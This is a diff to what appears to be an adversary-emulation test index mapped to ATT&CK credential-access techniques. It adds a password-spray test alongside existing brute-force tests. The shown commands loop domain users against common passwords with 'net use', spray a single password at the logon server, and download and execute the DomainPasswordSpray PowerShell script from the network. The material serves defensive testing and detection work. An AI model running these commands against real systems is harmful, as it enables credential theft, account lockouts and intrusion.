@@ -18880,13 +18880,13 @@ credential-access:
           type: String
           default: YOUR_COMPANY
       executor:
+        name: command_prompt
         command: |
           net user /domain > #{input_file_users}
           echo "Password1" >> #{input_file_passwords}
           echo "1q2w3e4r" >> #{input_file_passwords}
           echo "Password!" >> #{input_file_passwords}
           @FOR /F %n in (#{input_file_users}) DO @FOR /F %p in (#{input_file_passwords}) DO @net use #{remote_host} /user:#{domain}\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete #{remote_host} > NUL
-        name: command_prompt
   T1110.003:
     technique:
       external_references:
@@ -18986,10 +18986,33 @@ credential-access:
         prereq_command: if not exist %temp%\users.txt (exit /b 1)
         get_prereq_command: PathToAtomicsFolder\T1110.003\src\parse_net_users.bat
       executor:
+        name: command_prompt
+        elevation_required: false
         command: '@FOR /F %n in (%temp%\users.txt) do @echo | set/p=. & @net use %logonserver%\IPC$
           /user:"%userdomain%\%n" "#{password}" 1>NUL 2>&1 && @echo [*] %n:#{password}
-          && @net use /delete %logonserver%\IPC$ > NUL'
-        name: command_prompt
+          && @net use /delete %logonserver%\IPC$ > NUL
+
+'
+    - name: Password Spray (DomainPasswordSpray)
+      auto_generated_guid: 263ae743-515f-4786-ac7d-41ef3a0d4b2b
+      description: |
+        Perform a domain password spray using the DomainPasswordSpray tool. It will try a single password against all users in the domain
+
+        https://github.com/dafthack/DomainPasswordSpray
+      supported_platforms:
+      - windows
+      input_arguments:
+        domain:
+          description: Domain to brute force against
+          type: String
+          default: "(Get-ADDomain | Select-Object -ExpandProperty Name)"
+      executor:
+        name: powershell
+        elevation_required: false
+        command: 'IEX (IWR ''https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1'');
+          Invoke-DomainPasswordSpray -Password Spring2017 -Domain #{domain} -Force
+
+'
   T1552.004:
     technique:
       id: attack-pattern--60b508a1-6a5e-46b1-821a-9f7b78752abf
